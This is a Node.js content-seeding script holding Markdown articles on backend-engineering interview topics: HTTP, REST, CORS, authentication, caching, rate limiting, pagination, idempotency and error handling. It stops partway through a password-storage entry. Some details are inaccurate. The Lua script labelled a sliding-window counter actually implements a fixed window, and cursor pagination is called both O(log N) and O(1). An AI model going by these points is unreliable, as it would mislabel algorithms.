const fs = require('fs');
const path = require('path');

const contentDir = path.join(__dirname, '..', 'content');

const articles = [
  // =========================================================================
  // 1. BACKEND FUNDAMENTALS & ARCHITECTURE (content/backend)
  // =========================================================================
  {
    section: 'backend',
    slug: 'what-happens-when-you-enter-a-url-in-a-browser',
    title: 'What Happens When You Enter a URL in a Browser?',
    category: 'Fundamentals',
    description: 'Detailed lifecycle from keystroke, DNS resolution, TCP handshake, TLS negotiation, HTTP exchange, to server rendering.',
    content: `---
title: "What Happens When You Enter a URL in a Browser?"
category: "Fundamentals"
description: "Detailed lifecycle from keystroke, DNS resolution, TCP handshake, TLS negotiation, HTTP exchange, to server rendering."
---

# What Happens When You Enter a URL in a Browser?

Understanding the complete sequence of events from typing a URL like \`https://api.example.com/users\` into a browser to receiving and rendering the response is a fundamental question that tests networking, operating systems, and backend architecture.

---

## 1. High-Level Flow Diagram

\`\`\`
[User Enters URL]
       │
       ▼
[DNS Resolution] ──► (Browser Cache ➔ OS Cache ➔ Router ➔ ISP Resolver ➔ Root ➔ TLD ➔ Authoritative)
       │
       ▼
[TCP Connection] ──► (3-Way Handshake: SYN ➔ SYN-ACK ➔ ACK)
       │
       ▼
[TLS Handshake]  ──► (Certificate Validation, Key Exchange, Cipher Suite Negotiation)
       │
       ▼
[HTTP Request]   ──► (Sent via Socket: Headers, Cookies, Payload)
       │
       ▼
[Server Process] ──► (Load Balancer ➔ Reverse Proxy ➔ Web Server ➔ App Logic ➔ DB)
       │
       ▼
[HTTP Response]  ──► (Status Code 200, Content-Type, HTML/JSON Body)
       │
       ▼
[Browser Render] ──► (DOM Tree, CSSOM, Render Tree, Layout, Paint, JS Execution)
\`\`\`

---

## 2. Step-by-Step Breakdown

### Step 1: URL Parsing & HSTS Check
- The browser parses the protocol (\`https\`), hostname (\`api.example.com\`), port (\`443\` default for HTTPS), and path (\`/users\`).
- It verifies its **HSTS (HTTP Strict Transport Security)** preload list to force HTTPS before sending any packet.

### Step 2: DNS Resolution
To resolve the IP address corresponding to the hostname:
1. **Browser DNS Cache:** Chrome/Firefox internal cache.
2. **OS Resolver Cache:** Querying the local OS cache (hosts file / \`systemd-resolved\`).
3. **Recursive DNS Resolver (ISP/Cloudflare 1.1.1.1):**
   - Queries **Root DNS Servers** (\`.\`) ➔ Returns **TLD DNS Servers** (\`.com\`).
   - Queries **TLD DNS Servers** ➔ Returns **Authoritative Name Servers** for \`example.com\`.
   - Queries **Authoritative Name Server** ➔ Returns the \`A\` (IPv4) or \`AAAA\` (IPv6) record.

### Step 3: TCP 3-Way Handshake
With the target IP, the client initiates a reliable TCP transport stream:
1. **SYN:** Client sends a synchronise segment with an initial sequence number (\`ISN_c\`).
2. **SYN-ACK:** Server responds with SYN and acknowledges (\`ACK = ISN_c + 1\`).
3. **ACK:** Client acknowledges server's sequence number (\`ACK = ISN_s + 1\`).

### Step 4: TLS 1.3 Handshake (for HTTPS)
1. **ClientHello:** Supported cipher suites, TLS version, and client random/KeyShare.
2. **ServerHello & Encrypted Extensions:** Server picks cipher, sends certificate and Server KeyShare.
3. **Verification & Symmetric Key Generation:** Client verifies the certificate against root CAs, and both compute symmetric session keys.

### Step 5: Backend Request Processing
1. **Edge / Anycast Routing & CDN:** Request hits the nearest PoP (Cloudflare, CloudFront).
2. **Load Balancer (Nginx / ALB):** Terminates TLS, enforces rate limits, routes to internal application instances.
3. **Application Server:** Runs middleware (Auth, CORS, Logging), routes to controller, executes queries against Database/Cache.
4. **Response Generation:** Serializes response to JSON/HTML with headers (\`Content-Type\`, \`Cache-Control\`, \`ETag\`).

---

## Key Interview Takeaways
- **Performance Optimizations:** DNS caching, HTTP/2 multiplexing, HTTP/3 (QUIC) 0-RTT handshakes, Connection Keep-Alive, CDN edge caching.
- **Security Checkpoints:** HSTS, TLS certificate validation, CORS preflight verification.
`
  },
  {
    section: 'backend',
    slug: 'what-is-an-api',
    title: 'What is an API? Architectural Paradigms & Protocols',
    category: 'Architecture & APIs',
    description: 'Definition, contract abstraction, client-server communication styles (REST, GraphQL, gRPC, WebSockets, Webhooks).',
    content: `---
title: "What is an API? Architectural Paradigms & Protocols"
category: "Architecture & APIs"
description: "Definition, contract abstraction, client-server communication styles (REST, GraphQL, gRPC, WebSockets, Webhooks)."
---

# What is an API?

An **API (Application Programming Interface)** is a formal contractual specification that defines how software components communicate, exchange data, and execute remote procedures without needing internal implementation knowledge.

---

## 1. Core API Protocols Comparison

| Protocol / Paradigm | Transport | Payload Format | Communication Pattern | Best For |
| :--- | :--- | :--- | :--- | :--- |
| **REST** | HTTP/1.1, HTTP/2 | JSON, XML | Request-Response (Stateless) | Public web APIs, CRUD resource manipulation |
| **GraphQL** | HTTP (POST) | JSON | Declarative Query-Response | Complex nested entities, mobile apps with bandwidth constraints |
| **gRPC** | HTTP/2 | Protocol Buffers (Binary) | Bi-directional streaming, RPC | Microservice-to-microservice low latency internal RPC |
| **WebSockets** | TCP (Upgraded) | Binary / Text | Full-Duplex Bi-directional | Real-time chat, collaborative docs, financial ticker feeds |
| **Webhooks** | HTTP POST | JSON | Asynchronous Event-Driven | Payment gateways (Stripe), CI/CD events, notifications |

---

## 2. API Contract & Abstraction Principles

1. **Information Hiding:** Internal database schemas, database types, and business logic are abstracted behind stable endpoints.
2. **Loose Coupling:** Clients and servers can evolve independently as long as the contract is preserved.
3. **Statelessness:** In REST, each request contains all context needed (token, parameters) for the server to fulfill it.

\`\`\`typescript
// Example: REST API Controller Contract (Express / Node.js)
import { Request, Response } from 'express';

export async function getUserProfile(req: Request, res: Response) {
  try {
    const userId = req.params.id;
    const user = await userService.findById(userId);
    
    if (!user) {
      return res.status(404).json({ error: 'UserNotFound', message: 'No user with provided ID.' });
    }

    // Expose only public DTO contract, never raw internal DB entities
    return res.status(200).json({
      id: user.id,
      name: user.fullName,
      email: user.email,
      createdAt: user.createdAt,
    });
  } catch (error) {
    return res.status(500).json({ error: 'InternalServerError' });
  }
}
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'rest-vs-soap',
    title: 'What is the Difference Between REST and SOAP?',
    category: 'Architecture & APIs',
    description: 'Architectural comparison between REST (Representational State Transfer) and SOAP (Simple Object Access Protocol).',
    content: `---
title: "What is the Difference Between REST and SOAP?"
category: "Architecture & APIs"
description: "Architectural comparison between REST (Representational State Transfer) and SOAP (Simple Object Access Protocol)."
---

# REST vs. SOAP

**REST** is an architectural style based on web standards (HTTP, URIs), while **SOAP** is a strict, standardized messaging protocol defined by W3C using XML envelopes and WS-* security standards.

---

## Comparison Matrix

| Feature | REST (Representational State Transfer) | SOAP (Simple Object Access Protocol) |
| :--- | :--- | :--- |
| **Type** | Architectural style | Strict XML messaging protocol |
| **Data Format** | JSON (predominant), XML, YAML, Plain Text | Strictly XML |
| **Transport** | Exclusively HTTP/HTTPS | HTTP, SMTP, TCP, JMS, etc. |
| **Contract** | OpenAPI / Swagger (optional) | WSDL (Web Services Description Language - mandatory) |
| **State** | Strictly stateless | Can support stateful operations |
| **Caching** | Native HTTP caching (\`Cache-Control\`, \`ETag\`) | Not natively cacheable via HTTP |
| **Security** | HTTPS, OAuth 2.0, JWT, API Keys | WS-Security (enterprise-grade message-level encryption) |
| **Payload Size** | Lightweight JSON, low overhead | Heavy XML with envelope, headers, and body |
| **Typical Use Cases** | Modern web, mobile apps, SaaS, microservices | Enterprise legacy systems, banking, payment rails |

---

## When to Choose Which?

- **Choose REST:** Building public developer APIs, mobile application backends, cloud-native services, and high-throughput systems requiring HTTP caching.
- **Choose SOAP:** Legacy enterprise systems, banking/financial transactions requiring formal ACID distributed transactions (WS-AtomicTransaction) or formal WS-Security compliance.
`
  },
  {
    section: 'backend',
    slug: 'restful-api-design-principles',
    title: 'What is RESTful API Design?',
    category: 'Architecture & APIs',
    description: 'Guiding constraints, resource-oriented URIs, Richardson Maturity Model, HATEOAS, and idempotency rules.',
    content: `---
title: "What is RESTful API Design?"
category: "Architecture & APIs"
description: "Guiding constraints, resource-oriented URIs, Richardson Maturity Model, HATEOAS, and idempotency rules."
---

# RESTful API Design Principles

REST (Representational State Transfer) was introduced by Roy Fielding in his 2000 doctoral dissertation. An API is considered **RESTful** when it adheres to 6 core constraints.

---

## 1. The 6 REST Architectural Constraints

1. **Client-Server Architecture:** Separation of user interface concerns from data storage concerns.
2. **Statelessness:** No client context is stored on the server between requests. Each request carries complete authentication and parameter state.
3. **Cacheability:** Responses must explicitly declare whether they are cacheable (\`Cache-Control\`, \`Expires\`).
4. **Uniform Interface:** Standardized URIs, standard HTTP verbs, and self-descriptive messages.
5. **Layered System:** The client cannot tell whether it is connected directly to the end server or an intermediary (proxy, gateway, CDN).
6. **Code on Demand (Optional):** Servers can temporarily extend client functionality by transferring executable code (e.g., JavaScript).

---

## 2. Resource-Oriented URI Best Practices

\`\`\`
# Good RESTful URIs (Nouns in plural, hierarchical relationships)
GET    /api/v1/users                 # List users
POST   /api/v1/users                 # Create new user
GET    /api/v1/users/42              # Get user 42
PUT    /api/v1/users/42              # Full replacement of user 42
PATCH  /api/v1/users/42              # Partial update of user 42
DELETE /api/v1/users/42              # Delete user 42
GET    /api/v1/users/42/orders       # Get orders belonging to user 42

# Anti-patterns (Avoid verbs in URLs)
GET    /api/v1/getUser?id=42         # BAD: Verb in URL
POST   /api/v1/deleteUser            # BAD: POST used instead of DELETE verb
\`\`\`

---

## 3. Richardson Maturity Model

- **Level 0:** The Swamp of POX (Single URI, single POST verb, e.g. RPC-style).
- **Level 1:** Individual Resources (Different URIs for different entities).
- **Level 2:** HTTP Verbs & Status Codes (Standard verbs \`GET\`, \`POST\`, \`DELETE\` and status codes \`200\`, \`201\`, \`404\`).
- **Level 3:** HATEOAS (Hypermedia As The Engine Of Application State - responses contain dynamic navigational links).
`
  },
  {
    section: 'backend',
    slug: 'http-methods-explained',
    title: 'HTTP Methods: GET, POST, PUT, PATCH, DELETE',
    category: 'Architecture & APIs',
    description: 'Semantics, idempotency, safety, request body rules, and proper usage of HTTP verbs.',
    content: `---
title: "HTTP Methods: GET, POST, PUT, PATCH, DELETE"
category: "Architecture & APIs"
description: "Semantics, idempotency, safety, request body rules, and proper usage of HTTP verbs."
---

# HTTP Methods Explained

HTTP defines a set of request methods to indicate the desired action to be performed on a given resource.

---

## Method Characteristics Matrix

| Method | Safe? | Idempotent? | Request Body? | Typical Success Status | Purpose |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **GET** | Yes | Yes | No | 200 OK | Retrieve representation of a resource. |
| **POST** | No | No | Yes | 201 Created / 200 OK | Create a subordinate resource or trigger processing. |
| **PUT** | No | Yes | Yes | 200 OK / 204 No Content | Completely replace or create resource at specific URI. |
| **PATCH** | No | No (typically) | Yes | 200 OK / 204 No Content | Apply partial modifications to a resource. |
| **DELETE**| No | Yes | Optional | 200 OK / 204 No Content | Remove the target resource. |
| **HEAD** | Yes | Yes | No | 200 OK | Same as GET but returns only response headers. |
| **OPTIONS**| Yes | Yes | No | 204 No Content | Describes communication options (CORS preflight). |

---

## Safe vs. Idempotent

- **Safe:** The method produces no side effects on the server state (read-only operations like \`GET\`, \`HEAD\`, \`OPTIONS\`).
- **Idempotent:** Executing the request $N$ times produces the exact same server state as executing it once (e.g. \`GET\`, \`PUT\`, \`DELETE\`).

\`\`\`
# PUT vs PATCH Example:
# Original Entity: { "id": 1, "name": "Alice", "role": "Engineer", "age": 28 }

# PUT Request Payload: { "name": "Alice", "role": "Tech Lead" }
# Resulting Entity:   { "id": 1, "name": "Alice", "role": "Tech Lead" } (age is wiped/nullified if omitted)

# PATCH Request Payload: { "role": "Tech Lead" }
# Resulting Entity:     { "id": 1, "name": "Alice", "role": "Tech Lead", "age": 28 } (only role updated)
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'http-status-codes-guide',
    title: 'HTTP Status Codes: 200, 201, 400, 401, 403, 404, 500',
    category: 'Architecture & APIs',
    description: 'Comprehensive guide to HTTP status classes (1xx, 2xx, 3xx, 4xx, 5xx) and production error handling.',
    content: `---
title: "HTTP Status Codes: 200, 201, 400, 401, 403, 404, 500"
category: "Architecture & APIs"
description: "Comprehensive guide to HTTP status classes (1xx, 2xx, 3xx, 4xx, 5xx) and production error handling."
---

# HTTP Status Codes Guide

HTTP response status codes indicate whether a specific HTTP request has been successfully completed.

---

## 1. Status Code Categories

- **1xx (Informational):** Request received, continuing process (e.g., \`101 Switching Protocols\` for WebSockets).
- **2xx (Successful):** The action was successfully received, understood, and accepted.
- **3xx (Redirection):** Further action needs to be taken by the user agent.
- **4xx (Client Error):** The request contains bad syntax or cannot be fulfilled due to client mistake.
- **5xx (Server Error):** The server failed to fulfill an apparently valid request.

---

## 2. Most Critical Codes in Backend Engineering

### 2xx Success
- \`200 OK\`: Standard response for successful GET, PUT, PATCH, or DELETE.
- \`201 Created\`: Resource created successfully (typically contains \`Location\` header).
- \`204 No Content\`: Action succeeded, but no payload returned in response (common for DELETE/PUT).

### 4xx Client Errors
- \`400 Bad Request\`: Invalid syntax, malformed JSON body, or schema validation error.
- \`401 Unauthorized\`: Client lacks valid authentication credentials (e.g. expired/missing JWT).
- \`403 Forbidden\`: Client is authenticated, but lacks permissions (RBAC) to access the resource.
- \`404 Not Found\`: Target resource does not exist.
- \`409 Conflict\`: Request conflicts with current state (e.g. duplicate email on user registration).
- \`422 Unprocessable Entity\`: Syntax is correct, but semantic validation fails.
- \`429 Too Many Requests\`: Rate limit exceeded (should return \`Retry-After\` header).

### 5xx Server Errors
- \`500 Internal Server Error\`: Unhandled exception in backend application code.
- \`502 Bad Gateway\`: Reverse proxy / gateway received invalid response from upstream microservice.
- \`503 Service Unavailable\`: Server is overloaded or down for maintenance.
- \`504 Gateway Timeout\`: Upstream microservice / database failed to respond in time.
`
  },
  {
    section: 'backend',
    slug: 'authentication-vs-authorization',
    title: 'Authentication vs. Authorization',
    category: 'Security & Auth',
    description: 'AuthN (Who are you?) vs. AuthZ (What permissions do you have?) with RBAC, ABAC, and token mechanics.',
    content: `---
title: "Authentication vs. Authorization"
category: "Security & Auth"
description: "AuthN (Who are you?) vs. AuthZ (What permissions do you have?) with RBAC, ABAC, and token mechanics."
---

# Authentication vs. Authorization

While frequently grouped under security ("Auth"), **Authentication (AuthN)** and **Authorization (AuthZ)** address fundamentally different security concerns.

---

## Comparison Table

| Attribute | Authentication (AuthN) | Authorization (AuthZ) |
| :--- | :--- | :--- |
| **Core Question** | *"Who are you?"* (Identity verification) | *"What are you allowed to do?"* (Permissions verification) |
| **Execution Order** | Must happen **first** | Happens **after** identity is confirmed |
| **Mechanisms** | Passwords, MFA/2FA, Biometrics, Passkeys, OAuth SSO | RBAC (Role-Based), ABAC (Attribute-Based), ACLs |
| **Data Artifact** | Identity Token (ID Token), Session ID, Credentials | Access Token, Scopes, Permission claims |
| **HTTP Failure** | \`401 Unauthorized\` | \`403 Forbidden\` |

---

## Authorization Models

### 1. RBAC (Role-Based Access Control)
Users are assigned static roles (\`Admin\`, \`Editor\`, \`Viewer\`), and permissions are bound to roles.
\`\`\`typescript
function requireRole(role: string) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.user || !req.user.roles.includes(role)) {
      return res.status(403).json({ error: 'Forbidden: Insufficient privileges' });
    }
    next();
  };
}
\`\`\`

### 2. ABAC (Attribute-Based Access Control)
Evaluates dynamic attributes (user department, resource owner, time of day, IP geolocation, environment).
\`\`\`typescript
// Policy: "A user can edit an article ONLY IF they are the author AND the article is in Draft state"
function canEditArticle(user: User, article: Article): boolean {
  return user.id === article.authorId && article.status === 'DRAFT';
}
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'what-is-middleware',
    title: 'What is Middleware? Execution Pipelines & Patterns',
    category: 'Architecture & APIs',
    description: 'Interception pipeline pattern, request logging, authentication guards, body parsing, and error handlers.',
    content: `---
title: "What is Middleware? Execution Pipelines & Patterns"
category: "Architecture & APIs"
description: "Interception pipeline pattern, request logging, authentication guards, body parsing, and error handlers."
---

# What is Middleware?

In backend web frameworks (Express, NestJS, FastAPI, ASP.NET Core, Go Gin), **Middleware** is a software function placed in the HTTP request-response cycle that intercepts, inspects, transforms, or short-circuits incoming requests before they reach route handlers.

---

## 1. Middleware Pipeline Flow

\`\`\`
Incoming Request ──► [ Request Logger ] ──► [ CORS Guard ] ──► [ Rate Limiter ] ──► [ Auth Guard ] ──► [ Route Handler ]
                                                                                            │
                                                                                    (Invalid Token)
                                                                                            ▼
                                                                                   Return 401 Response
\`\`\`

---

## 2. Common Middleware Types

1. **Authentication & Authorization Guard:** Extracts Bearer JWT, validates signature, attaches \`req.user\`.
2. **CORS & Security Headers:** Attaches \`Access-Control-Allow-Origin\`, Helmet security headers.
3. **Body Parser & Compression:** Decodes JSON/Gzip into \`req.body\`.
4. **Rate Limiting:** Checks Redis token bucket per IP/API key.
5. **Correlation ID & Tracing:** Attaches \`X-Request-Id\` to trace logs across microservices.
6. **Centralized Error Handling:** Catches unhandled errors and maps them to standard JSON errors.

\`\`\`typescript
// Custom Express Authentication Middleware
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

export function authenticateJWT(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing or malformed Authorization header' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const payload = jwt.verify(token, process.env.JWT_SECRET!);
    (req as any).user = payload;
    next(); // Pass control to the next middleware in chain
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
}
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'understanding-cors',
    title: 'What is CORS? Cross-Origin Resource Sharing Guide',
    category: 'Security & Auth',
    description: 'Same-Origin Policy (SOP), simple requests vs preflight OPTIONS, allowed origins, credentials, and header configurations.',
    content: `---
title: "What is CORS? Cross-Origin Resource Sharing Guide"
category: "Security & Auth"
description: "Same-Origin Policy (SOP), simple requests vs preflight OPTIONS, allowed origins, credentials, and header configurations."
---

# What is CORS?

**CORS (Cross-Origin Resource Sharing)** is a browser security mechanism that relaxes the strict **Same-Origin Policy (SOP)** to allow web applications hosted on one origin (e.g. \`https://app.example.com\`) to access resources from a backend API on a different origin (e.g. \`https://api.example.com\`).

---

## 1. What Defines an Origin?

An origin consists of **Protocol + Domain + Port**:
- \`https://example.com:443\` vs \`http://example.com:80\` ➔ **Different origin** (different protocol/port).
- \`https://example.com\` vs \`https://api.example.com\` ➔ **Different origin** (different subdomain).
- \`https://example.com/page1\` vs \`https://example.com/page2\` ➔ **Same origin**.

---

## 2. Preflight Requests (OPTIONS)

For non-simple requests (e.g. \`Content-Type: application/json\`, custom headers like \`Authorization\`, or methods like \`PUT\`/\`DELETE\`), the browser sends an automatic preflight request before the actual request:

\`\`\`http
# 1. Browser sends preflight OPTIONS request:
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization, Content-Type

# 2. Server answers with allowed policies:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

# 3. Browser verifies headers, then executes actual POST request.
\`\`\`

---

## 3. Important Production Security Rules
- **Never use \`Access-Control-Allow-Origin: *\` with \`Access-Control-Allow-Credentials: true\`** (browsers will reject it for security).
- Whitelist explicit origins dynamically in your backend CORS middleware rather than reflecting \`Origin\` blindly.
`
  },
  {
    section: 'backend',
    slug: 'backend-caching-strategies',
    title: 'What is Caching and Why is it Useful?',
    category: 'Architecture & APIs',
    description: 'Cache-Aside, Write-Through, Write-Back, Cache Eviction (LRU/LFU), Cache Stampede, and Cache Penetration.',
    content: `---
title: "What is Caching and Why is it Useful?"
category: "Architecture & APIs"
description: "Cache-Aside, Write-Through, Write-Back, Cache Eviction (LRU/LFU), Cache Stampede, and Cache Penetration."
---

# Backend Caching Strategies

Caching stores copies of frequently accessed, computation-heavy, or slow database query results in fast in-memory storage (such as **Redis** or **Memcached**) to drastically reduce latency and protect primary databases from overload.

---

## 1. Primary Caching Patterns

### 1. Cache-Aside (Lazy Loading)
1. Application queries cache.
2. If **Cache Hit**: return cached data.
3. If **Cache Miss**: read from DB, store in cache with a TTL, and return.
- *Pros:* Resilient against cache failure, only caches requested data.
- *Cons:* Cache miss latency penalty; potential stale data if DB is updated without invalidation.

### 2. Write-Through
Application writes data to the cache, and the cache synchronously writes to the database.
- *Pros:* Data in cache is never stale.
- *Cons:* Higher write latency since every write hits two systems.

### 3. Write-Behind (Write-Back)
Application writes to cache; cache acknowledges immediately and batches writes to DB asynchronously.
- *Pros:* Highest write throughput.
- *Cons:* Risk of data loss if cache crashes before flushing to disk.

---

## 2. Classic Caching Pitfalls & Solutions

| Problem | Cause | Production Solution |
| :--- | :--- | :--- |
| **Cache Stampede (Thundering Herd)** | High-traffic key expires, 10,000 concurrent requests all miss cache and hit DB at once. | **Mutex / Distributed Lock** (only 1 request queries DB while others wait) or **Probabilistic Early Expiration (XFetch)**. |
| **Cache Penetration** | Requests for non-existent IDs (e.g. ID: \`-1\`) always miss cache and repeatedly hit DB. | **Bloom Filters** before cache or caching null values (\`SET key null EX 60\`). |
| **Cache Avalanche** | Multiple cache keys share the exact same TTL and expire simultaneously. | Add **Randomized Jitter** to TTLs (\`TTL = baseTTL + random(0, 300)\`). |
`
  },
  {
    section: 'backend',
    slug: 'rate-limiting-algorithms',
    title: 'What is Rate Limiting? Algorithms & Implementations',
    category: 'Architecture & APIs',
    description: 'Token Bucket, Leaky Bucket, Fixed Window, Sliding Window Log, and Sliding Window Counter.',
    content: `---
title: "What is Rate Limiting? Algorithms & Implementations"
category: "Architecture & APIs"
description: "Token Bucket, Leaky Bucket, Fixed Window, Sliding Window Log, and Sliding Window Counter."
---

# Rate Limiting Algorithms

**Rate Limiting** controls the rate of traffic sent or received by an API to protect resources against DoS attacks, prevent brute-force credential stuffing, ensure fair multi-tenant resource usage, and control third-party infrastructure costs.

---

## 1. The 4 Key Rate Limiting Algorithms

\`\`\`
1. Token Bucket:     Tokens added at fixed rate. Bursts allowed up to bucket capacity.
2. Leaky Bucket:     Requests enter queue; processed at fixed constant leak rate. Smooth output.
3. Fixed Window:     Limits requests per calendar window (e.g. 100 req/min). Suffers from edge boundary spikes.
4. Sliding Window:   Combines previous window weight with current window count for precise, smooth limits.
\`\`\`

---

## 2. Algorithm Tradeoff Summary

| Algorithm | Handles Traffic Bursts? | Memory Footprint | Complexity | Best For |
| :--- | :--- | :--- | :--- | :--- |
| **Token Bucket** | Yes (up to bucket size) | Minimal ($O(1)$ per key) | Low | Standard API Gateways (AWS API GW, Stripe) |
| **Leaky Bucket** | No (enforces smooth rate) | Moderate (queue size) | Medium | Steady background processing jobs |
| **Fixed Window** | Vulnerable to 2x boundary spikes | Minimal ($O(1)$) | Very Low | Simple rate limits where edge bursts are acceptable |
| **Sliding Window Counter** | Yes | Low ($O(1)$) | Medium | Production rate limiters with strict accuracy requirements |

---

## 3. Distributed Implementation with Redis

Using Redis Lua scripts ensures atomic execution across multiple horizontal API instances:

\`\`\`lua
-- Sliding Window Counter in Redis (Lua)
local key = KEYS[1]
local limit = tonumber(ARGV[1])
local current_count = redis.call('INCR', key)

if current_count == 1 then
    redis.call('EXPIRE', key, 60) -- 60s window
end

if current_count > limit then
    return 0 -- Rejected (HTTP 429)
else
    return 1 -- Allowed
end
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'pagination-strategies-offset-vs-cursor',
    title: 'What is Pagination? Offset vs. Cursor-Based Implementation',
    category: 'Architecture & APIs',
    description: 'Offset-Limit pagination vs Keysets/Cursor pagination, performance comparison on million-row tables.',
    content: `---
title: "What is Pagination? Offset vs. Cursor-Based Implementation"
category: "Architecture & APIs"
description: "Offset-Limit pagination vs Keysets/Cursor pagination, performance comparison on million-row tables."
---

# Pagination: Offset vs. Cursor

When querying datasets containing thousands or millions of records, returning all records in a single response leads to high database memory consumption, network saturation, and slow client render times. **Pagination** breaks data into manageable pages.

---

## 1. Offset-Based Pagination

\`\`\`sql
-- Page 1 (items 1-20)
SELECT * FROM orders ORDER BY created_at DESC LIMIT 20 OFFSET 0;

-- Page 5000 (items 100,000-100,020)
SELECT * FROM orders ORDER BY created_at DESC LIMIT 20 OFFSET 100000;
\`\`\`

- **How it works:** \`OFFSET N\` skips $N$ rows and returns the next \`LIMIT\`.
- **Flaws:**
  1. **Performance Degrades to $O(N)$:** The database must still read all $100,000$ rows from disk, sort them, and discard them before returning 20.
  2. **Page Drift / Missing Items:** If a new row is inserted while the user navigates between page 1 and page 2, rows shift and users see duplicate records.

---

## 2. Cursor-Based (Keyset) Pagination

\`\`\`sql
-- Page 1: Initial query
SELECT id, created_at, total FROM orders 
ORDER BY created_at DESC, id DESC 
LIMIT 20;

-- Page 2: Client passes cursor (created_at and id of last item from page 1)
SELECT id, created_at, total FROM orders 
WHERE (created_at, id) < ('2026-03-01T12:00:00Z', 9520)
ORDER BY created_at DESC, id DESC 
LIMIT 20;
\`\`\`

- **How it works:** Uses indexed columns (\`created_at\`, \`id\`) to seek directly to the next row ($O(\log N)$).
- **Pros:** Constant $O(1)$ seek time regardless of whether fetching page 1 or page 10,000. Immune to row insertion drift.
- **Cons:** Cannot jump directly to arbitrary page numbers (e.g. "Go to Page 42").
`
  },
  {
    section: 'backend',
    slug: 'idempotency-in-apis',
    title: 'What is Idempotency and How to Implement It?',
    category: 'Architecture & APIs',
    description: 'Definition of idempotency, handling network retries in payments, Idempotency-Key header design with Redis/DB.',
    content: `---
title: "What is Idempotency and How to Implement It?"
category: "Architecture & APIs"
description: "Definition of idempotency, handling network retries in payments, Idempotency-Key header design with Redis/DB."
---

# Idempotency in APIs

An API operation is **idempotent** if making multiple identical requests has the exact same side effect on the system state as making a single request.

---

## 1. Why Idempotency Matters

In distributed systems, networks are unreliable. If a client sends a \`POST /api/v1/payments\` request, the server might process the payment successfully, but the network connection drops before the client receives the \`200 OK\` response.
If the client automatically retries, without idempotency, **the customer gets charged twice!**

---

## 2. Implementing Idempotency with \`Idempotency-Key\`

\`\`\`
Client                          API Gateway / Server                      Redis / DB
  │                                      │                                    │
  ├── 1. POST /charge (Key: "abc-123") ──►│                                    │
  │                                      ├── 2. SETNX "idemp:abc-123" "IN_FLIGHT" ──►│
  │                                      │   (Acquires lock)                  │
  │                                      ├── 3. Execute Payment Logic         │
  │                                      ├── 4. Store Result & Response Body ──►│
  │◄── 5. 200 OK (Charged $50) ──────────┤                                    │
  │                                      │                                    │
  │  --- Network drops / Retry ---       │                                    │
  ├── 6. POST /charge (Key: "abc-123") ──►│                                    │
  │                                      ├── 7. GET "idemp:abc-123" ──────────►│
  │                                      │   (Found cached response!)         │
  │◄── 8. 200 OK (Cached Result Returned)─┤                                    │
\`\`\`

---

## 3. Implementation Workflow

1. Client generates a unique UUID (\`Idempotency-Key: 9b1deb4d-...\`).
2. Server attempts an atomic insertion of the key in Redis (\`SET key IN_FLIGHT NX EX 120\`).
3. If key already exists:
   - If \`IN_FLIGHT\`: return \`409 Conflict\` (concurrent in-flight request).
   - If \`COMPLETED\`: return the cached response payload immediately without re-executing logic.
4. If key is new: execute business transaction, save response, set status to \`COMPLETED\`.
`
  },
  {
    section: 'backend',
    slug: 'backend-error-handling-patterns',
    title: 'How Do You Handle Errors in a Backend Application?',
    category: 'Architecture & APIs',
    description: 'Centralized error handling, RFC 7807 Problem Details, operational vs programmer errors, custom error hierarchies.',
    content: `---
title: "How Do You Handle Errors in a Backend Application?"
category: "Architecture & APIs"
description: "Centralized error handling, RFC 7807 Problem Details, operational vs programmer errors, custom error hierarchies."
---

# Backend Error Handling Patterns

Robust error handling ensures unexpected failures do not crash the service, returns clear, predictable error contracts to clients, and logs actionable diagnostic context for engineering teams.

---

## 1. Operational vs. Programmer Errors

- **Operational Errors:** Expected runtime errors in normal execution (e.g., invalid user input, expired auth token, database timeout, missing file). Must be caught and translated into user-friendly HTTP 4xx/5xx responses.
- **Programmer Errors:** Bugs in code (e.g., \`TypeError: Cannot read property of undefined\`, syntax errors). Must trigger automated crash reporting (Sentry), fail fast, and restart cleanly via process managers (PM2 / Kubernetes pods).

---

## 2. Standard RFC 7807 Problem Details Contract

\`\`\`json
{
  "type": "https://api.example.com/errors/insufficient-funds",
  "title": "Insufficient Funds",
  "status": 400,
  "detail": "Your account balance of $12.50 is lower than the transfer amount of $50.00.",
  "instance": "/accounts/acc_9921/transfers",
  "code": "INSUFFICIENT_FUNDS",
  "timestamp": "2026-03-01T15:30:00Z"
}
\`\`\`

---

## 3. Centralized Custom Error Class Architecture

\`\`\`typescript
// AppError base class
export class AppError extends Error {
  constructor(
    public statusCode: number,
    public message: string,
    public code: string,
    public isOperational = true
  ) {
    super(message);
    Object.setPrototypeOf(this, new.target.prototype);
    Error.captureStackTrace(this, this.constructor);
  }
}

export class NotFoundError extends AppError {
  constructor(resource: string, id: string) {
    super(404, \`\${resource} with ID \${id} was not found.\`, 'RESOURCE_NOT_FOUND');
  }
}

// Global Express Error Middleware
export function errorHandler(err: Error, req: Request, res: Response, next: NextFunction) {
  if (err instanceof AppError) {
    return res.status(err.statusCode).json({
      error: err.code,
      message: err.message,
    });
  }

  // Unhandled Programmer Error: Mask internal details from client
  console.error('[UNHANDLED_EXCEPTION]', err);
  return res.status(500).json({
    error: 'INTERNAL_SERVER_ERROR',
    message: 'An unexpected internal error occurred.',
  });
}
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'secure-password-storage-hashing',
    title: 'How Do You Securely Store Passwords?',
    category: 'Security & Auth',
